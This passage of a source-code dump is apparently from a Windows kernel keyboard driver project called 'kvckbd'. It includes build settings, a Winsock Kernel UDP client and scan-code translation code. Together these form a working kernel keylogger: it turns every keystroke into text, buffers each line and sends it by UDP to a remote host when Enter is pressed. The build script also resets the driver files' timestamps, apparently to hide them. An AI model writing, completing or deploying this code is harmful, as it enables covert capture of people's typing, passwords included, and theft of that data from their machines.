      <JunkFiles Include="$(ReleaseDir)\*.log" />
    </ItemGroup>
    <Delete Files="@(JunkFiles)" ContinueOnError="true" />
    <!-- Opóźnione usunięcie folderu obj -->
    <Exec Command="ping -n 4 127.0.0.1 &gt; nul &amp; rd /S /Q &quot;$(ReleaseDir)\obj&quot; 2&gt;nul" IgnoreExitCode="true" />
    <!-- Ustaw datę TYLKO na finalnych plikach w folderze kvckbd -->
    <Exec Command="powershell -Command &quot;if (Test-Path '$(ReleaseDir)\kvckbd\kvckbd.sys') { (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.sys').CreationTime='2026-01-01 00:00:00'; (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.sys').LastWriteTime='2026-01-01 00:00:00' }&quot;" IgnoreExitCode="true" />
    <Exec Command="powershell -Command &quot;if (Test-Path '$(ReleaseDir)\kvckbd\kvckbd.inf') { (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.inf').CreationTime='2026-01-01 00:00:00'; (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.inf').LastWriteTime='2026-01-01 00:00:00' }&quot;" IgnoreExitCode="true" />
    <Exec Command="powershell -Command &quot;if (Test-Path '$(ReleaseDir)\kvckbd\kvckbd.cat') { (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.cat').CreationTime='2026-01-01 00:00:00'; (Get-Item '$(ReleaseDir)\kvckbd\kvckbd.cat').LastWriteTime='2026-01-01 00:00:00' }&quot;" IgnoreExitCode="true" />
    <Message Text="=== FINAL CLEANUP COMPLETED ===" Importance="high" />
    <Message Text="Final files in $(ReleaseDir)\kvckbd\:" Importance="high" />
    <Exec Command="dir &quot;$(ReleaseDir)\kvckbd&quot;" IgnoreExitCode="true" />
  </Target>
</Project>


================================================================================
 FILE: kvckbd\kvckbd.vcxproj.filters
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-09 10:07:48
 File size     : 1.84 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="kvckbd.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="scancode.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="driver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="network.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="scancode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="network.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="kvckbd.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>


================================================================================
 FILE: kvckbd\network.c
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-07 09:21:30
 File size     : 7.07 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    network.c

Abstract:
    Winsock Kernel (WSK) client implementation for UDP communication.
    Provides network connectivity for transmitting keyboard data to
    a remote host.

Environment:
    Kernel mode only.

--*/

#include "network.h"

//
// Memory Pool Tag for Network Operations
//
#define NETWORK_POOL_TAG    'kteN'  // 'Netk' in little-endian

//
// Global Network State
//
SOCKET      ClientSocket = 0;
LPWSTR      g_HostName = NULL;
LPWSTR      g_PortName = NULL;
PADDRINFOEXW g_AddrInfo = NULL;

/*++

Routine: NetClient_Initialize

Description:
    Initializes a WSK UDP client socket and configures it to communicate
    with the specified remote host. This function:
    1. Allocates buffers for host and port information
    2. Resolves the remote address using WSKGetAddrInfo
    3. Creates a UDP socket
    4. Configures the socket with the remote address for sendto operations

Arguments:
    NodeName        - Remote host address (IP or hostname), e.g., L"192.168.0.2"
    ServiceName     - Remote port number as string, e.g., L"8765"
    AddressFamily   - Address family (AF_INET for IPv4, AF_INET6 for IPv6)
    SocketType      - Socket type (SOCK_DGRAM for UDP)

Return Value:
    STATUS_SUCCESS              - Socket initialized successfully
    STATUS_INSUFFICIENT_RESOURCES - Memory allocation failed
    Other NTSTATUS              - WSK operation failed

--*/
NTSTATUS 
NetClient_Initialize(
    _In_opt_ LPCWSTR        NodeName,
    _In_opt_ LPCWSTR        ServiceName,
    _In_     ADDRESS_FAMILY AddressFamily,
    _In_     USHORT         SocketType
)
{
    NTSTATUS        Status;
    ADDRINFOEXW     Hints;
    PADDRINFOEXW    CurrentAddr;
    
    Status = STATUS_SUCCESS;
    
    //
    // Allocate buffers for host and port name strings
    //
    g_HostName = (LPWSTR)ExAllocatePoolZero(
        PagedPool,
        NI_MAXHOST * sizeof(WCHAR),
        NETWORK_POOL_TAG
    );
    
    g_PortName = (LPWSTR)ExAllocatePoolZero(
        PagedPool,
        NI_MAXSERV * sizeof(WCHAR),
        NETWORK_POOL_TAG
    );
    
    if (g_HostName == NULL || g_PortName == NULL)
    {
        KBD_ERROR("NetClient_Initialize: Failed to allocate name buffers");
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    //
    // Initialize address resolution hints
    //
    RtlZeroMemory(&Hints, sizeof(ADDRINFOEXW));
    Hints.ai_family = AddressFamily;
    Hints.ai_socktype = SocketType;
    Hints.ai_protocol = (SocketType == SOCK_DGRAM) ? IPPROTO_UDP : IPPROTO_TCP;
    
    //
    // Resolve the remote address
    //
    Status = WSKGetAddrInfo(
        NodeName,
        ServiceName,
        NS_ALL,
        NULL,
        &Hints,
        &g_AddrInfo,
        WSK_INFINITE_WAIT,
        NULL,
        NULL
    );
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("WSKGetAddrInfo failed: 0x%08X", Status);
        goto Cleanup;
    }
    
    //
    // Verify we got at least one address
    //
    if (g_AddrInfo == NULL)
    {
        KBD_ERROR("Server name '%ws' could not be resolved", NodeName);
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    //
    // Iterate through resolved addresses and create socket
    //
    for (CurrentAddr = g_AddrInfo; CurrentAddr != NULL; CurrentAddr = CurrentAddr->ai_next)
    {
        //
        // Create socket
        //
        Status = WSKSocket(
            &ClientSocket,
            (ADDRESS_FAMILY)CurrentAddr->ai_family,
            (USHORT)CurrentAddr->ai_socktype,
            CurrentAddr->ai_protocol,
            NULL
        );
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("WSKSocket failed: 0x%08X", Status);
            continue;
        }
        
        //
        // Get printable address and port
        //
        Status = WSKGetNameInfo(
            CurrentAddr->ai_addr,
            (ULONG)CurrentAddr->ai_addrlen,
            g_HostName,
            NI_MAXHOST,
            g_PortName,
            NI_MAXSERV,
            NI_NUMERICHOST | NI_NUMERICSERV
        );
        
        if (!NT_SUCCESS(Status))
        {
            KBD_ERROR("WSKGetNameInfo failed: 0x%08X", Status);
            WSKCloseSocket(ClientSocket);
            ClientSocket = 0;
            continue;
        }
        
        KBD_INFO("Attempting connection to %ws:%ws", g_HostName, g_PortName);
        
        //
        // For UDP sockets, configure the default remote address
        //
        if (CurrentAddr->ai_socktype == SOCK_DGRAM)
        {
            Status = WSKIoctl(
                ClientSocket,
                SIO_WSK_SET_SENDTO_ADDRESS,
                CurrentAddr->ai_addr,
                CurrentAddr->ai_addrlen,
                NULL,
                0,
                NULL,
                NULL,
                NULL
            );
            
            if (!NT_SUCCESS(Status))
            {
                KBD_ERROR("WSKIoctl SIO_WSK_SET_SENDTO_ADDRESS failed: 0x%08X", Status);
                WSKCloseSocket(ClientSocket);
                ClientSocket = 0;
                continue;
            }
        }
        
        //
        // Socket successfully configured
        //
        break;
    }
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("Unable to establish connection to %ws:%ws", NodeName, ServiceName);
        goto Cleanup;
    }
    
    KBD_INFO("Network client initialized successfully");
    
Cleanup:
    
    //
    // Clean up on failure
    //
    if (!NT_SUCCESS(Status))
    {
        if (g_HostName != NULL)
        {
            ExFreePoolWithTag(g_HostName, NETWORK_POOL_TAG);
            g_HostName = NULL;
        }
        
        if (g_PortName != NULL)
        {
            ExFreePoolWithTag(g_PortName, NETWORK_POOL_TAG);
            g_PortName = NULL;
        }
        
        if (g_AddrInfo != NULL)
        {
            WSKFreeAddrInfo(g_AddrInfo);
            g_AddrInfo = NULL;
        }
    }
    
    return Status;
}

/*++

Routine: NetClient_Cleanup

Description:
    Cleans up all network client resources. Closes the socket and
    frees all allocated memory.

Arguments:
    None.

Return Value:
    None.

--*/
VOID 
NetClient_Cleanup(
    VOID
)
{
    //
    // Free host name buffer
    //
    if (g_HostName != NULL)
    {
        ExFreePoolWithTag(g_HostName, NETWORK_POOL_TAG);
        g_HostName = NULL;
    }
    
    //
    // Free port name buffer
    //
    if (g_PortName != NULL)
    {
        ExFreePoolWithTag(g_PortName, NETWORK_POOL_TAG);
        g_PortName = NULL;
    }
    
    //
    // Free address information
    //
    if (g_AddrInfo != NULL)
    {
        WSKFreeAddrInfo(g_AddrInfo);
        g_AddrInfo = NULL;
    }
    
    //
    // Close socket
    //
    if (ClientSocket != 0)
    {
        WSKCloseSocket(ClientSocket);
        ClientSocket = 0;
    }
    
    KBD_INFO("Network client cleanup completed");
}


================================================================================
 FILE: kvckbd\network.h
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-07 09:21:30
 File size     : 8.09 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    network.h

Abstract:
    Winsock Kernel (WSK) interface declarations. Provides a simplified
    interface for network communication in kernel mode, specifically
    UDP socket operations for transmitting keyboard data.

Environment:
    Kernel mode only.

--*/

#pragma once

#include "driver.h"
#include <wsk.h>

//
// Type Definitions
//
#define SOCKET ULONG_PTR

//
// Global Socket Handle
//
extern SOCKET ClientSocket;

//
// WSK Socket Flags
//
#ifndef WSK_INVALID_SOCKET
    #define WSK_INVALID_SOCKET          ((SOCKET)(~0))
#endif

#ifndef WSK_FLAG_INVALID_SOCKET
    #define WSK_FLAG_INVALID_SOCKET     0xFFFFFFFF
#endif

#ifndef WSK_FLAG_STREAM_SOCKET
    #define WSK_FLAG_STREAM_SOCKET      0x00000008
#endif

//
// WSK Initialization Data
//
typedef struct _WSKDATA
{
    UINT16  HighestVersion;
    UINT16  LowestVersion;
    
} WSKDATA, *PWSKDATA;

//
// WSK Overlapped Structure (for asynchronous operations)
//
typedef struct _WSKOVERLAPPED
{
    ULONG_PTR   Internal;
    ULONG_PTR   InternalHigh;
    
    union {
        struct {
            ULONG Offset;
            ULONG OffsetHigh;
        } DUMMYSTRUCTNAME;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    
    KEVENT      Event;
    
} WSKOVERLAPPED, *PWSKOVERLAPPED;

//
// WSK Completion Routine Type
//
typedef VOID (*LPWSKOVERLAPPED_COMPLETION_ROUTINE)(
    _In_ NTSTATUS       Status,
    _In_ ULONG_PTR      BytesTransferred,
    _In_ WSKOVERLAPPED* Overlapped
);

//
// Network Client Functions
//

/*++

Routine: NetClient_Initialize

Description:
    Initializes a WSK UDP client socket and configures it to send data
    to the specified remote host and port.

Arguments:
    NodeName        - Remote host name or IP address (e.g., L"192.168.0.2")
    ServiceName     - Remote port number (e.g., L"8765")
    AddressFamily   - Address family (AF_INET for IPv4)
    SocketType      - Socket type (SOCK_DGRAM for UDP)

Return Value:
    STATUS_SUCCESS on success, appropriate NTSTATUS error code otherwise.

--*/
NTSTATUS
NetClient_Initialize(
    _In_opt_ LPCWSTR        NodeName,
    _In_opt_ LPCWSTR        ServiceName,
    _In_     ADDRESS_FAMILY AddressFamily,
    _In_     USHORT         SocketType
);

/*++

Routine: NetClient_Cleanup

Description:
    Cleans up WSK client resources, closes the socket, and frees
    all allocated memory.

Arguments:
    None.

Return Value:
    None.

--*/
VOID 
NetClient_Cleanup(
    VOID
);

//
// WSK Core Functions
//

VOID WSKAPI 
WSKSetLastError(
    _In_ NTSTATUS Status
);

NTSTATUS WSKAPI 
WSKGetLastError(
    VOID
);

NTSTATUS WSKAPI 
WSKStartup(
    _In_  UINT16    Version,
    _Out_ WSKDATA*  WSKData
);

VOID WSKAPI 
WSKCleanup(
    VOID
);

VOID WSKAPI 
WSKCreateEvent(
    _Out_ KEVENT* Event
);

NTSTATUS WSKAPI 
WSKGetOverlappedResult(
    _In_     SOCKET         Socket,
    _In_     WSKOVERLAPPED* Overlapped,
    _Out_opt_ SIZE_T*       TransferBytes,
    _In_     BOOLEAN        Wait
);

//
// WSK Address Resolution Functions
//

NTSTATUS WSKAPI 
WSKGetAddrInfo(
    _In_opt_ LPCWSTR                        NodeName,
    _In_opt_ LPCWSTR                        ServiceName,
    _In_     UINT32                         Namespace,
    _In_opt_ GUID*                          Provider,
    _In_opt_ PADDRINFOEXW                   Hints,
    _Outptr_result_maybenull_ PADDRINFOEXW* Result,
    _In_opt_ UINT32                         TimeoutMilliseconds,
    _In_opt_ WSKOVERLAPPED*                 Overlapped,
    _In_opt_ LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);

VOID WSKAPI 
WSKFreeAddrInfo(
    _In_ PADDRINFOEXW Data
);

NTSTATUS WSKAPI 
WSKGetNameInfo(
    _In_  const SOCKADDR*   Address,
    _In_  ULONG             AddressLength,
    _Out_writes_opt_(NodeNameSize) LPWSTR NodeName,
    _In_  ULONG             NodeNameSize,
    _Out_writes_opt_(ServiceNameSize) LPWSTR ServiceName,
    _In_  ULONG             ServiceNameSize,
    _In_  ULONG             Flags
);

NTSTATUS WSKAPI 
WSKAddressToString(
    _In_reads_bytes_(AddressLength) SOCKADDR* SockAddress,
    _In_    UINT32  AddressLength,
    _Out_writes_to_(*AddressStringLength, *AddressStringLength) LPWSTR AddressString,
    _Inout_ UINT32* AddressStringLength
);

NTSTATUS WSKAPI 
WSKStringToAddress(
    _In_    PCWSTR      AddressString,
    _Inout_ SOCKADDR*   SockAddress,
    _Inout_ UINT32*     AddressLength
);

//
// WSK Socket Operations
//

NTSTATUS WSKAPI 
WSKSocket(
    _Out_ SOCKET*               Socket,
    _In_  ADDRESS_FAMILY        AddressFamily,
    _In_  USHORT                SocketType,
    _In_  ULONG                 Protocol,
    _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor
);

NTSTATUS WSKAPI 
WSKCloseSocket(
    _In_ SOCKET Socket
);

NTSTATUS WSKAPI 
WSKIoctl(
    _In_  SOCKET        Socket,
    _In_  ULONG         ControlCode,
    _In_reads_bytes_opt_(InputSize) PVOID InputBuffer,
    _In_  SIZE_T        InputSize,
    _Out_writes_bytes_opt_(OutputSize) PVOID OutputBuffer,
    _In_  SIZE_T        OutputSize,
    _Out_opt_ SIZE_T*   OutputSizeReturned,
    _In_opt_  WSKOVERLAPPED* Overlapped,
    _In_opt_  LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);

NTSTATUS WSKAPI 
WSKSetSocketOpt(
    _In_ SOCKET         Socket,
    _In_ ULONG          OptionLevel,
    _In_ ULONG          OptionName,
    _In_reads_bytes_(InputSize) PVOID InputBuffer,
    _In_ SIZE_T         InputSize
);

NTSTATUS WSKAPI 
WSKGetSocketOpt(
    _In_    SOCKET      Socket,
    _In_    ULONG       OptionLevel,
    _In_    ULONG       OptionName,
    _Out_writes_bytes_(*OutputSize) PVOID OutputBuffer,
    _Inout_ SIZE_T*     OutputSize
);

//
// WSK Network Operations
//

NTSTATUS WSKAPI 
WSKBind(
    _In_ SOCKET     Socket,
    _In_ PSOCKADDR  LocalAddress,
    _In_ SIZE_T     LocalAddressLength
);

NTSTATUS WSKAPI 
WSKAccpet(
    _In_  SOCKET        Socket,
    _Out_ SOCKET*       SocketClient,
    _Out_opt_ PSOCKADDR LocalAddress,
    _In_  SIZE_T        LocalAddressLength,
    _Out_opt_ PSOCKADDR RemoteAddress,
    _In_  SIZE_T        RemoteAddressLength
);

NTSTATUS WSKAPI 
WSKListen(
    _In_ SOCKET Socket,
    _In_ INT    BackLog
);

NTSTATUS WSKAPI 
WSKConnect(
    _In_ SOCKET     Socket,
    _In_ PSOCKADDR  RemoteAddress,
    _In_ SIZE_T     RemoteAddressLength
);

NTSTATUS WSKAPI 
WSKDisconnect(
    _In_ SOCKET Socket,
    _In_ ULONG  Flags
);

//
// WSK Data Transfer Functions
//

NTSTATUS WSKAPI 
WSKSend(
    _In_     SOCKET         Socket,
    _In_     PVOID          Buffer,
    _In_     SIZE_T         BufferLength,
    _Out_opt_ SIZE_T*       NumberOfBytesSent,
    _In_     ULONG          Flags,
    _In_opt_ WSKOVERLAPPED* Overlapped,
    _In_opt_ LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);

NTSTATUS WSKAPI 
WSKSendTo(
    _In_      SOCKET        Socket,
    _In_      PVOID         Buffer,
    _In_      SIZE_T        BufferLength,
    _Out_opt_ SIZE_T*       NumberOfBytesSent,
    _Reserved_ ULONG        Flags,
    _In_opt_  PSOCKADDR     RemoteAddress,
    _In_      SIZE_T        RemoteAddressLength,
    _In_opt_  WSKOVERLAPPED* Overlapped,
    _In_opt_  LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);

NTSTATUS WSKAPI 
WSKReceive(
    _In_     SOCKET         Socket,
    _In_     PVOID          Buffer,
    _In_     SIZE_T         BufferLength,
    _Out_opt_ SIZE_T*       NumberOfBytesRecvd,
    _In_     ULONG          Flags,
    _In_opt_ WSKOVERLAPPED* Overlapped,
    _In_opt_ LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);

NTSTATUS WSKAPI 
WSKReceiveFrom(
    _In_      SOCKET        Socket,
    _In_      PVOID         Buffer,
    _In_      SIZE_T        BufferLength,
    _Out_opt_ SIZE_T*       NumberOfBytesRecvd,
    _Reserved_ ULONG        Flags,
    _Out_opt_ PSOCKADDR     RemoteAddress,
    _In_      SIZE_T        RemoteAddressLength,
    _In_opt_  WSKOVERLAPPED* Overlapped,
    _In_opt_  LPWSKOVERLAPPED_COMPLETION_ROUTINE CompletionRoutine
);


================================================================================
 FILE: kvckbd\scancode.c
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-09 09:54:58
 File size     : 11.79 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    scancode.c

Abstract:
    Optimized keyboard scan code processing with runtime translation.
    Single base table + runtime computation for shift/caps combinations.

Environment:
    Kernel mode only.

--*/

#include "scancode.h"
#include "network.h"

//
// Keyboard State
//
ULONG g_KeyboardState = 0;
BOOLEAN g_RightAltPressed = FALSE;

//
// Line Buffer
//
#define KEYBOARD_LINE_BUFFER_SIZE 512

typedef struct _KEYBOARD_LINE_BUFFER {
    UCHAR Buffer[KEYBOARD_LINE_BUFFER_SIZE];
    SIZE_T Position;
    KSPIN_LOCK Lock;
    BOOLEAN Initialized;
} KEYBOARD_LINE_BUFFER, *PKEYBOARD_LINE_BUFFER;

static KEYBOARD_LINE_BUFFER g_LineBuffer = {0};

//
// Base Scan Code Table (lowercase/normal state)
// Indices 0-83 map directly to scan codes 0x00-0x53
//
static const UCHAR g_BaseScancodes[84][12] = {
    "?", "[Esc]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BS]", "[Tab]",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[Ent]", "[LCt]", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";", "\'", "`", "[LSh]", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "[RSh]", "[KP*]", "[LAl]", " ", "[Cap]",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "[Num]", "[Scr]",
    "[KP7]", "[KP8]", "[KP9]", "[KP-]", "[KP4]", "[KP5]", "[KP6]", "[KP+]",
    "[KP1]", "[KP2]", "[KP3]", "[KP0]", "[KP.]"
};

//
// Shift mappings for digits (scan codes 0x02-0x0B map to 0-9 in array)
//
static const UCHAR g_ShiftDigits[10][2] = {
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"
};

//
// Shift mappings for special characters
//
static const UCHAR g_ShiftChars[][2] = {
    "{", "}", "|", ":", "\"", "~", "<", ">", "?"
};

//
// Extended (E0) scan codes
//
static const UCHAR g_E0Scancodes[18][12] = {
    "[RCt]", "[KP/]", "[Prt]", "[RAl]", "[Hom]", "[Up]", "[PgU]",
    "[Lft]", "[Rgt]", "[End]", "[Dn]", "[PgD]", "[Ins]", "[Del]",
    "[LWin]", "[RWin]", "[Men]", "?"
};

//
// Polish AltGr characters
//
static const UCHAR g_PolishCharsAltGr[][4] = {
    "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ź", "ż",
    "Ą", "Ć", "Ę", "Ł", "Ń", "Ó", "Ś", "Ź", "Ż"
};

//
// Scan code definitions
//
#define SC_CAPSLOCK     0x3A
#define SC_LSHIFT       0x2A
#define SC_RSHIFT       0x36
#define SC_NUMLOCK      0x45
#define SC_RALT         0x38

#define SC_E0_RCTRL     0x1D
#define SC_E0_RALT      0x38
#define SC_E0_LWIN      0x5B
#define SC_E0_RWIN      0x5C
#define SC_E0_MENU      0x5D

#define MAX_NORMAL_SC   0x54
#define MAX_E0_SC       0x5D

//
// Scan code range checks
//
#define IS_LETTER(sc) (((sc) >= 0x10 && (sc) <= 0x19) || \
                       ((sc) >= 0x1E && (sc) <= 0x26) || \
                       ((sc) >= 0x2C && (sc) <= 0x32))

#define IS_DIGIT(sc)  ((sc) >= 0x02 && (sc) <= 0x0B)

#define IS_MODIFIER(str) ( \
    (strcmp((PCCHAR)(str), "[LSh]") == 0) || \
    (strcmp((PCCHAR)(str), "[RSh]") == 0) || \
    (strcmp((PCCHAR)(str), "[LCt]") == 0) || \
    (strcmp((PCCHAR)(str), "[RCt]") == 0) || \
    (strcmp((PCCHAR)(str), "[LAl]") == 0) || \
    (strcmp((PCCHAR)(str), "[RAl]") == 0) || \
    (strcmp((PCCHAR)(str), "[Cap]") == 0) || \
    (strcmp((PCCHAR)(str), "[Num]") == 0) || \
    (strcmp((PCCHAR)(str), "[Scr]") == 0) )

#define IS_SEND_TRIGGER(str) (strcmp((PCCHAR)(str), "[Ent]") == 0)

//
// Helper: Convert letter to uppercase
//
static VOID ToUpperCase(UCHAR* dest, const UCHAR* src)
{
    SIZE_T i = 0;
    while (src[i] && i < 11) {
        dest[i] = (src[i] >= 'a' && src[i] <= 'z') ? (src[i] - 32) : src[i];
        i++;
    }
    dest[i] = '\0';
}

//
// Helper: Get shifted character for special chars
//
static PCUCHAR GetShiftedChar(UCHAR makeCode)
{
    switch (makeCode) {
        case 0x1A: return g_ShiftChars[0]; // [ -> {
        case 0x1B: return g_ShiftChars[1]; // ] -> }
        case 0x2B: return g_ShiftChars[2]; // \ -> |
        case 0x27: return g_ShiftChars[3]; // ; -> :
        case 0x28: return g_ShiftChars[4]; // ' -> "
        case 0x29: return g_ShiftChars[5]; // ` -> ~
        case 0x33: return g_ShiftChars[6]; // , -> 
        case 0x34: return g_ShiftChars[7]; // . -> >
        case 0x35: return g_ShiftChars[8]; // / -> ?
        default: return NULL;
    }
}

VOID
KbdHandler_InitializeBuffer(VOID)
{
    KeInitializeSpinLock(&g_LineBuffer.Lock);
    g_LineBuffer.Position = 0;
    g_LineBuffer.Initialized = TRUE;
}

VOID
KbdHandler_SendBufferedLine(VOID)
{
    NTSTATUS Status;
    SIZE_T BytesSent;
    KIRQL OldIrql;
    UCHAR LocalBuffer[KEYBOARD_LINE_BUFFER_SIZE];
    SIZE_T LocalPosition;

    if (!g_LineBuffer.Initialized)
        return;

    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
    
    if (g_LineBuffer.Position > 0) {
        LocalPosition = g_LineBuffer.Position;
        RtlCopyMemory(LocalBuffer, g_LineBuffer.Buffer, LocalPosition);
        g_LineBuffer.Position = 0;
        
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
        
        Status = WSKSendTo(
            ClientSocket,
            LocalBuffer,
            LocalPosition,
            &BytesSent,
            0,
            NULL,
            0,
            NULL,
            NULL
        );

        if (!NT_SUCCESS(Status)) {
            KBD_ERROR("WSKSendTo failed: 0x%08X", Status);
        }
    } else {
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
    }
}

VOID
KbdHandler_FlushBuffer(VOID)
{
    if (g_LineBuffer.Initialized && g_LineBuffer.Position > 0) {
        KbdHandler_SendBufferedLine();
    }
}

BOOLEAN
KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString)
{
    SIZE_T keyLen;
    KIRQL OldIrql;

    if (!g_LineBuffer.Initialized || KeyString == NULL)
        return FALSE;

    keyLen = strlen((PCCHAR)KeyString);
    if (keyLen == 0 || keyLen >= KEYBOARD_LINE_BUFFER_SIZE)
        return FALSE;

    if (IS_SEND_TRIGGER(KeyString)) {
        KbdHandler_SendBufferedLine();
        return TRUE;
    }

    if (IS_MODIFIER(KeyString))
        return FALSE;

    // Ignore F1-F12
    if (KeyString[0] == 'F' && 
        (KeyString[1] >= '1' && KeyString[1] <= '9') &&
        (KeyString[2] == '\0' || 
         (KeyString[2] >= '0' && KeyString[2] <= '2' && KeyString[3] == '\0'))) {
        return FALSE;
    }

    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);

    if (g_LineBuffer.Position + keyLen < KEYBOARD_LINE_BUFFER_SIZE - 1) {
        RtlCopyMemory(
            &g_LineBuffer.Buffer[g_LineBuffer.Position], 
            KeyString, 
            keyLen
        );
        g_LineBuffer.Position += keyLen;
    } else {
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
        KbdHandler_SendBufferedLine();
        return TRUE;
    }

    KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
    return FALSE;
}

VOID
KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
{
    UCHAR MakeCode;
    PCUCHAR KeyString;
    BOOLEAN IsKeyPress;
    UCHAR UpperBuf[12];
    BOOLEAN ShiftActive, CapsActive;
    
    if (InputData == NULL)
        return;
    
    MakeCode = (UCHAR)InputData->MakeCode;
    IsKeyPress = !FlagOn(InputData->Flags, KEY_BREAK);
    
    //
    // Handle E0 extended codes
    //
    if (FlagOn(InputData->Flags, KEY_E0)) {
        switch (MakeCode) {
            case 0x1D: KeyString = g_E0Scancodes[0]; break;
            case 0x35: KeyString = g_E0Scancodes[1]; break;
            case 0x37: KeyString = g_E0Scancodes[2]; break;
            case 0x38: KeyString = g_E0Scancodes[3]; break;
            case 0x47: KeyString = g_E0Scancodes[4]; break;
            case 0x48: KeyString = g_E0Scancodes[5]; break;
            case 0x49: KeyString = g_E0Scancodes[6]; break;
            case 0x4B: KeyString = g_E0Scancodes[7]; break;
            case 0x4D: KeyString = g_E0Scancodes[8]; break;
            case 0x4F: KeyString = g_E0Scancodes[9]; break;
            case 0x50: KeyString = g_E0Scancodes[10]; break;
            case 0x51: KeyString = g_E0Scancodes[11]; break;
            case 0x52: KeyString = g_E0Scancodes[12]; break;
            case 0x53: KeyString = g_E0Scancodes[13]; break;
            case 0x5B: KeyString = g_E0Scancodes[14]; break;
            case 0x5C: KeyString = g_E0Scancodes[15]; break;
            case 0x5D: KeyString = g_E0Scancodes[16]; break;
            default:   KeyString = g_E0Scancodes[17]; break;
        }
        
        if (MakeCode == SC_E0_RALT)
            g_RightAltPressed = IsKeyPress;
        
        if (MakeCode > MAX_E0_SC)
            return;
    }
    //
    // Handle normal scan codes
    //
    else {
        if (MakeCode > MAX_NORMAL_SC)
            return;
        
        ShiftActive = (g_KeyboardState & KBD_STATE_SHIFT) != 0;
        CapsActive = (g_KeyboardState & KBD_STATE_CAPSLOCK) != 0;
        
        //
        // Check Polish AltGr combinations
        //
        if (g_RightAltPressed && IsKeyPress) {
            switch (MakeCode) {
                case 0x1E: KeyString = g_PolishCharsAltGr[ShiftActive ? 9 : 0]; goto OutputKey;
                case 0x2E: KeyString = g_PolishCharsAltGr[ShiftActive ? 10 : 1]; goto OutputKey;
                case 0x12: KeyString = g_PolishCharsAltGr[ShiftActive ? 11 : 2]; goto OutputKey;
                case 0x26: KeyString = g_PolishCharsAltGr[ShiftActive ? 12 : 3]; goto OutputKey;
                case 0x31: KeyString = g_PolishCharsAltGr[ShiftActive ? 13 : 4]; goto OutputKey;
                case 0x18: KeyString = g_PolishCharsAltGr[ShiftActive ? 14 : 5]; goto OutputKey;
